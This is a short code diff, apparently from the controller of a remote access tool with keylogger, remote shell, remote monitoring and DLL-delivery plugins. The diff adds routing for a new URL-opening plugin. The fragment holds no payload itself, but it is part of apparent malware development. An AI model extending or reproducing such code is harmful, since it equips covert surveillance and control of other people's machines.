@@ -20,6 +20,7 @@ const
   REMOTE_SHELL_PLUGIN_ID      = 'RemoteShellPlugin';
   REMOTE_MONITORING_PLUGIN_ID = 'RemoteMonitoringPlugin';
   KEYLOGGER_PLUGIN_ID         = 'KeyloggerPlugin';
+  OPEN_URL_PLUGIN_ID          = 'OpenURLPlugin';
   MAX_JSON_BUFFER_SIZE        = 16 * 1024 * 1024;
   PACKET_TYPE_JSON            = $01;
   PACKET_TYPE_DLL             = $02;
@@ -983,6 +984,8 @@ begin
           SendRemoteMonitoringPlugin(aLine)
         else if SameText(PluginID, KEYLOGGER_PLUGIN_ID) then
           SendKeyloggerPlugin(aLine)
+        else if (SameText(PluginID, OPEN_URL_PLUGIN_ID)) then
+          SendPlugin(aLine, OPEN_URL_PLUGIN_ID)
         else
           SendPlugin(aLine, PluginID);
       end;
